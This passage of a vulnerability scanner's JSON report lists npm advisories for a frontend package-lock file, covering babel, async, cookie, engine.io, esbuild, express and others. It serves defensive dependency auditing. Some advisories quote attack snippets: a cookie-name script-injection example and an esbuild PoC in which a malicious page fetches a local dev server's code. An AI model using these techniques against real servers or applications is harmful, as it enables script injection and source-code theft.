depends on `@babel\/helpers`). Upgrading to `@babel\/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel\/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https:\/\/github.com\/babel\/babel\/pull\/17173."},"partialFingerprints": {"vulnerabilityHash": "713f3c996911af26c2eed0edfbf6d80e"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?@babel\/helpers","index": 0 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/%40babel%2Fhelpers@7.17.2"}]}]}, {"ruleId": "GHSA-968p-4wvh-cqc8","level": "warning","message": {"text": "GHSA-968p-4wvh-cqc8 - ### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel\/preset-env` with the [`targets`](https:\/\/babeljs.io\/docs\/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https:\/\/github.com\/tc39\/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome\/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel\/preset-env` is using by enabling the [`debug` option](https:\/\/babeljs.io\/docs\/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel\/helpers` and `@babel\/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel\/helpers`, and instead you depend on `@babel\/core` (which itself depends on `@babel\/helpers`). Upgrading to `@babel\/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel\/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https:\/\/github.com\/babel\/babel\/pull\/17173."},"partialFingerprints": {"vulnerabilityHash": "713f3c996911af26c2eed0edfbf6d80e"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?@babel\/runtime","index": 1 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/%40babel%2Fruntime@7.16.7"}]}]}, {"ruleId": "GHSA-67hx-6x53-jw92","level": "warning","message": {"text": "GHSA-67hx-6x53-jw92 - ### Impact\n\nUsing Babel to compile code that was specifically crafted by an attacker can lead to arbitrary code execution during compilation, when using plugins that rely on the `path.evaluate()`or `path.evaluateTruthy()` internal Babel methods.\n\nKnown affected plugins are:\n- `@babel\/plugin-transform-runtime`\n- `@babel\/preset-env` when using its [`useBuiltIns`](https:\/\/babeljs.io\/docs\/babel-preset-env#usebuiltins) option\n- Any \"polyfill provider\" plugin that depends on `@babel\/helper-define-polyfill-provider`, such as `babel-plugin-polyfill-corejs3`, `babel-plugin-polyfill-corejs2`, `babel-plugin-polyfill-es-shims`, `babel-plugin-polyfill-regenerator`\n\nNo other plugins under the `@babel\/` namespace are impacted, but third-party plugins might be.\n\n**Users that only compile trusted code are not impacted.**\n\n### Patches\n\nThe vulnerability has been fixed in `@babel\/traverse@7.23.2`.\n\nBabel 6 does not receive security fixes anymore (see [Babel's security policy](https:\/\/github.com\/babel\/babel\/security\/policy)), hence there is no patch planned for `babel-traverse@6`.\n\n### Workarounds\n\n- Upgrade `@babel\/traverse` to v7.23.2 or higher. You can do this by deleting it from your package manager's lockfile and re-installing the dependencies. `@babel\/core` >=7.23.2 will automatically pull in a non-vulnerable version.\n- If you cannot upgrade `@babel\/traverse` and are using one of the affected packages mentioned above, upgrade them to their latest version to avoid triggering the vulnerable code path in affected `@babel\/traverse` versions:\n  - `@babel\/plugin-transform-runtime` v7.23.2\n  - `@babel\/preset-env` v7.23.2\n  - `@babel\/helper-define-polyfill-provider` v0.4.3\n  - `babel-plugin-polyfill-corejs2` v0.4.6\n  - `babel-plugin-polyfill-corejs3` v0.8.5\n  - `babel-plugin-polyfill-es-shims` v0.10.0\n  - `babel-plugin-polyfill-regenerator` v0.5.3"},"partialFingerprints": {"vulnerabilityHash": "ad306a5279ea0aa103e3e18e5f0c88c9"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?@babel\/traverse","index": 2 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/%40babel%2Ftraverse@7.17.3"}]}]}, {"ruleId": "CVE-2021-43138","level": "warning","message": {"text": "CVE-2021-43138 - In Async before 2.6.4 and 3.x before 3.2.2, a malicious user can obtain privileges via the mapValues() method, aka lib\/internal\/iterator.js createObjectIterator prototype pollution.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2021-43138 for details"},"partialFingerprints": {"vulnerabilityHash": "9c2a88ceda85224f4c181c7ba77e73a9"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?async","index": 3 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/async@2.6.3"}]}]}, {"ruleId": "GHSA-fwr7-v2mv-hh25","level": "warning","message": {"text": "GHSA-fwr7-v2mv-hh25 - A vulnerability exists in Async through 3.2.1 for 3.x and through 2.6.3 for 2.x (fixed in 3.2.2 and 2.6.4), which could let a malicious user obtain privileges via the `mapValues()` method."},"partialFingerprints": {"vulnerabilityHash": "30091ace5d0db549142edd791e1d2a0a"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?async","index": 3 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/async@2.6.3"}]}]}, {"ruleId": "CVE-2024-39249","level": "warning","message": {"text": "CVE-2024-39249 - Async <= 2.6.4 and <= 3.2.5 are vulnerable to ReDoS (Regular Expression Denial of Service) while parsing function in autoinject function. NOTE: this is disputed by the supplier because there is no realistic threat model: regular expressions are not used with untrusted input.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-39249 for details"},"partialFingerprints": {"vulnerabilityHash": "793a518fc18676e3357c4f193e4b0864"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?async","index": 3 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/async@2.6.3"}]}]}, {"ruleId": "CVE-2024-45590","level": "warning","message": {"text": "CVE-2024-45590 - body-parser is Node.js body parsing middleware. body-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service. This issue is patched in 1.20.3.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-45590 for details"},"partialFingerprints": {"vulnerabilityHash": "32f3bfcc268140c0794b1b61ea157aa3"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?body-parser","index": 4 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/body-parser@1.19.2"}]}]}, {"ruleId": "GHSA-qwcr-r2fm-qrc7","level": "warning","message": {"text": "GHSA-qwcr-r2fm-qrc7 - ### Impact\n\nbody-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.\n\n### Patches\n\nthis issue is patched in 1.20.3\n\n### References\n"},"partialFingerprints": {"vulnerabilityHash": "ff8d90791ac24f45b5bbe8e087418998"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?body-parser","index": 4 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/body-parser@1.19.2"}]}]}, {"ruleId": "CVE-2025-5889","level": "warning","message": {"text": "CVE-2025-5889 - A vulnerability was found in juliangruber brace-expansion up to 1.1.11\/2.0.1\/3.0.0\/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is a5b98a4f30d7813266b221435e1eaaf25a1b0ac5. It is recommended to upgrade the affected component."},"partialFingerprints": {"vulnerabilityHash": "eb01f56a85cfe69db8f674b895897843"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?brace-expansion","index": 5 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/brace-expansion@1.1.11"}]}]}, {"ruleId": "GHSA-v6h2-p8h4-qcjw","level": "warning","message": {"text": "GHSA-v6h2-p8h4-qcjw - A vulnerability was found in juliangruber brace-expansion up to 1.1.11\/2.0.1\/3.0.0\/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component."},"partialFingerprints": {"vulnerabilityHash": "204360428ddc804dfb383983f3c08107"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?brace-expansion","index": 5 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/brace-expansion@1.1.11"}]}]}, {"ruleId": "CVE-2024-4068","level": "warning","message": {"text": "CVE-2024-4068 - The NPM package `braces`, versions prior to 3.0.3, fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib\/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash."},"partialFingerprints": {"vulnerabilityHash": "c945c2ba581af4e0fe0c830ac450cdde"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?braces","index": 6 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/braces@3.0.2"}]}]}, {"ruleId": "GHSA-grv7-fg5c-xmjg","level": "warning","message": {"text": "GHSA-grv7-fg5c-xmjg - The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib\/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n"},"partialFingerprints": {"vulnerabilityHash": "290d1a5c3399286f87472104159866ff"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?braces","index": 6 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/braces@3.0.2"}]}]}, {"ruleId": "CVE-2024-47764","level": "warning","message": {"text": "CVE-2024-47764 - cookie is a basic HTTP cookie parser and serializer for HTTP servers. The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. A similar escape can be used for path and domain, which could be abused to alter other fields of the cookie. Upgrade to 0.7.0, which updates the validation for name, path, and domain."},"partialFingerprints": {"vulnerabilityHash": "e7f24f0e74138d95adf9f9963ae20dc1"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?cookie","index": 7 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/cookie@0.4.2"}]}]}, {"ruleId": "GHSA-pxg6-pf52-xh8x","level": "warning","message": {"text": "GHSA-pxg6-pf52-xh8x - ### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')<\/script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')<\/script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https:\/\/github.com\/jshttp\/cookie\/pull\/167"},"partialFingerprints": {"vulnerabilityHash": "8547e42d7d7ae72a2bc0f4acd53cf955"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?cookie","index": 7 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/cookie@0.4.2"}]}]}, {"ruleId": "CVE-2024-21538","level": "warning","message": {"text": "CVE-2024-21538 - Versions of the package cross-spawn before 6.0.6, from 7.0.0 and before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string."},"partialFingerprints": {"vulnerabilityHash": "570d4d49d47fe98dd6f080ea2b368d91"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?cross-spawn","index": 8 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/cross-spawn@7.0.3"}]}]}, {"ruleId": "GHSA-3xgq-45jj-v275","level": "warning","message": {"text": "GHSA-3xgq-45jj-v275 - Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string."},"partialFingerprints": {"vulnerabilityHash": "8b144b098f74b74539ee170c6783dd66"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?cross-spawn","index": 8 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/cross-spawn@7.0.3"}]}]}, {"ruleId": "CVE-2022-38900","level": "warning","message": {"text": "CVE-2022-38900 - decode-uri-component 0.2.0 is vulnerable to Improper Input Validation resulting in DoS."},"partialFingerprints": {"vulnerabilityHash": "8fc14b681f77a64bd4b03d8153e2f468"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?decode-uri-component","index": 9 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/decode-uri-component@0.2.0"}]}]}, {"ruleId": "GHSA-w573-4hg7-7wgq","level": "warning","message": {"text": "GHSA-w573-4hg7-7wgq - decode-uri-component 0.2.0 is vulnerable to Improper Input Validation resulting in DoS."},"partialFingerprints": {"vulnerabilityHash": "07439650b087edc119115cd907f2453c"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?decode-uri-component","index": 9 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/decode-uri-component@0.2.0"}]}]}, {"ruleId": "CVE-2022-41940","level": "warning","message": {"text": "CVE-2022-41940 - Engine.IO is the implementation of transport-based cross-browser\/cross-device bi-directional communication layer for Socket.IO. A specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process. This impacts all the users of the engine.io package, including those who uses depending packages like socket.io. There is no known workaround except upgrading to a safe version. There are patches for this issue released in versions 3.6.1 and 6.2.1."},"partialFingerprints": {"vulnerabilityHash": "dd4e74d8082d0c042e9488b961c470e7"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?engine.io","index": 10 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/engine.io@6.1.2"}]}]}, {"ruleId": "CVE-2023-31125","level": "warning","message": {"text": "CVE-2023-31125 - Engine.IO is the implementation of transport-based cross-browser\/cross-device bi-directional communication layer for Socket.IO. An uncaught exception vulnerability was introduced in version 5.1.0 and included in version 4.1.0 of the `socket.io` parent package. Older versions are not impacted. A specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process. This impacts all the users of the `engine.io` package, including those who use depending packages like `socket.io`. This issue was fixed in version 6.4.2 of Engine.IO. There is no known workaround except upgrading to a safe version."},"partialFingerprints": {"vulnerabilityHash": "1f08484262fcc177ba43fb048dd5e987"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?engine.io","index": 10 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/engine.io@6.1.2"}]}]}, {"ruleId": "GHSA-q9mw-68c2-j6m5","level": "warning","message": {"text": "GHSA-q9mw-68c2-j6m5 - ### Impact\n\nA specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process.\n\n```\nTypeError: Cannot read properties of undefined (reading 'handlesUpgrades')\n    at Server.onWebSocket (build\/server.js:515:67)\n```\n\nThis impacts all the users of the [`engine.io`](https:\/\/www.npmjs.com\/package\/engine.io) package, including those who uses depending packages like [`socket.io`](https:\/\/www.npmjs.com\/package\/socket.io).\n\n### Patches\n\nA fix has been released today (2023\/05\/02): [6.4.2](https:\/\/github.com\/socketio\/engine.io\/releases\/tag\/6.4.2)\n\nThis bug was introduced in version 5.1.0 and included in version 4.1.0 of the `socket.io` parent package. Older versions are not impacted.\n\nFor `socket.io` users:\n\n| Version range               | `engine.io` version | Needs minor update?                                                                                    |\n|-----------------------------|---------------------|--------------------------------------------------------------------------------------------------------|\n| `socket.io@4.6.x`           | `~6.4.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@4.5.x`           | `~6.2.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.4.x`           | `~6.1.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.3.x`           | `~6.0.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.2.x`           | `~5.2.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.1.x`           | `~5.1.1`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.0.x`           | `~5.0.0`            | Not impacted |\n| `socket.io@3.1.x`           | `~4.1.0`            | Not impacted |\n| `socket.io@3.0.x`           | `~4.0.0`            | Not impacted |\n| `socket.io@2.5.0`           | `~3.6.0`            | Not impacted |\n| `socket.io@2.4.x` and below | `~3.5.0`            | Not impacted |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [`engine.io`](https:\/\/github.com\/socketio\/engine.io)\n\nThanks to Thomas Rinsma from Codean for the responsible disclosure."},"partialFingerprints": {"vulnerabilityHash": "b7abe2da46f3d4a369c2218ac261bd57"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?engine.io","index": 10 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/engine.io@6.1.2"}]}]}, {"ruleId": "GHSA-r7qp-cfhv-p84w","level": "warning","message": {"text": "GHSA-r7qp-cfhv-p84w - ### Impact\n\nA specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process.\n\n```\nevents.js:292\n      throw er; \/\/ Unhandled 'error' event\n      ^\n\nError: read ECONNRESET\n    at TCP.onStreamRead (internal\/stream_base_commons.js:209:20)\nEmitted 'error' event on Socket instance at:\n    at emitErrorNT (internal\/streams\/destroy.js:106:8)\n    at emitErrorCloseNT (internal\/streams\/destroy.js:74:3)\n    at processTicksAndRejections (internal\/process\/task_queues.js:80:21) {\n  errno: -104,\n  code: 'ECONNRESET',\n  syscall: 'read'\n}\n```\n\nThis impacts all the users of the [`engine.io`](https:\/\/www.npmjs.com\/package\/engine.io) package, including those who uses depending packages like [`socket.io`](https:\/\/www.npmjs.com\/package\/socket.io).\n\n### Patches\n\nA fix has been released today (2022\/11\/20):\n\n| Version range     | Fixed version |\n|-------------------|---------------|\n| `engine.io@3.x.y` | `3.6.1`       |\n| `engine.io@6.x.y` | `6.2.1`       |\n\nFor `socket.io` users:\n\n| Version range               | `engine.io` version | Needs minor update?                                                                                    |\n|-----------------------------|---------------------|--------------------------------------------------------------------------------------------------------|\n| `socket.io@4.5.x`           | `~6.2.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@4.4.x`           | `~6.1.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.3.x`           | `~6.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.2.x`           | `~5.2.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.1.x`           | `~5.1.1`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.0.x`           | `~5.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@3.1.x`           | `~4.1.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https:\/\/socket.io\/docs\/v4\/migrating-from-3-x-to-4-0\/)) |\n| `socket.io@3.0.x`           | `~4.0.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https:\/\/socket.io\/docs\/v4\/migrating-from-3-x-to-4-0\/)) |\n| `socket.io@2.5.0`           | `~3.6.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@2.4.x` and below | `~3.5.0`            | Please upgrade to `socket.io@2.5.0`                                                                    |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [`engine.io`](https:\/\/github.com\/socketio\/engine.io)\n\nThanks to [Jonathan Neve](https:\/\/github.com\/jonathanneve) for the responsible disclosure.\n"},"partialFingerprints": {"vulnerabilityHash": "5ec5cd6fef22919837ff6d0586a26748"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?engine.io","index": 10 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/engine.io@6.1.2"}]}]}, {"ruleId": "GHSA-67mh-4wv8-2f99","level": "warning","message": {"text": "GHSA-67mh-4wv8-2f99 - ### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps:\/\/github.com\/evanw\/esbuild\/blob\/df815ac27b84f8b34374c9182a93c94718f8a630\/pkg\/api\/serve_other.go#L121\nhttps:\/\/github.com\/evanw\/esbuild\/blob\/df815ac27b84f8b34374c9182a93c94718f8a630\/pkg\/api\/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http:\/\/malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http:\/\/127.0.0.1:8000\/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http:\/\/127.0.0.1:8000\/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `\/index.html`: normally you have a script tag here\n- Fetching `\/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `\/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('\/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18561484\/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http:\/\/127.0.0.1:8000\/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https:\/\/github.com\/user-attachments\/assets\/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites."},"partialFingerprints": {"vulnerabilityHash": "49f7d8fa6478d3c94746a89624260e34"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?esbuild","index": 11 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/esbuild@0.14.22"}]}]}, {"ruleId": "CVE-2024-29041","level": "warning","message": {"text": "CVE-2024-29041 - Express.js minimalist web framework for node. Versions of Express.js prior to 4.19.0 and all pre-release alpha and beta versions of 5.0 are affected by an open redirect vulnerability using malformed URLs. When a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https:\/\/github.com\/pillarjs\/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list. The main method impacted is `res.location()` but this is also called from within `res.redirect()`. The vulnerability is fixed in 4.19.2 and 5.0.0-beta.3."},"partialFingerprints": {"vulnerabilityHash": "39cd2c7c11833913ef85034c3bbde846"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?express","index": 12 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/express@4.17.3"}]}]}, {"ruleId": "GHSA-rv95-896h-c2vc","level": "warning","message": {"text": "GHSA-rv95-896h-c2vc - ### Impact\n\nVersions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https:\/\/github.com\/pillarjs\/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps:\/\/github.com\/expressjs\/express\/commit\/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps:\/\/github.com\/expressjs\/express\/commit\/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take on your own before passing the user input string to `res.location` or `res.redirect`.\n\n### References\n\nhttps:\/\/github.com\/expressjs\/express\/pull\/5539\nhttps:\/\/github.com\/koajs\/koa\/issues\/1800\nhttps:\/\/expressjs.com\/en\/4x\/api.html#res.location"},"partialFingerprints": {"vulnerabilityHash": "8947140a229a64fd13c2ae30276ee504"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?express","index": 12 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/express@4.17.3"}]}]}, {"ruleId": "CVE-2024-10491","level": "warning","message": {"text": "CVE-2024-10491 - A vulnerability has been identified in the Express response.links\u00A0function, allowing for arbitrary resource injection in the Link\u00A0header when unsanitized data is used.\n\nThe issue arises from improper sanitization in `Link` header values, which can allow a combination of characters like `,`, `;`, and `<>` to preload malicious resources.\n\nThis vulnerability is especially relevant for dynamic parameters.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-10491 for details"},"partialFingerprints": {"vulnerabilityHash": "ef940985dfd3008bda8682ec0f5b3abe"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?express","index": 12 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/express@4.17.3"}]}]}, {"ruleId": "GHSA-qw6h-vgh9-j6wx","level": "warning","message": {"text": "GHSA-qw6h-vgh9-j6wx - ### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n"},"partialFingerprints": {"vulnerabilityHash": 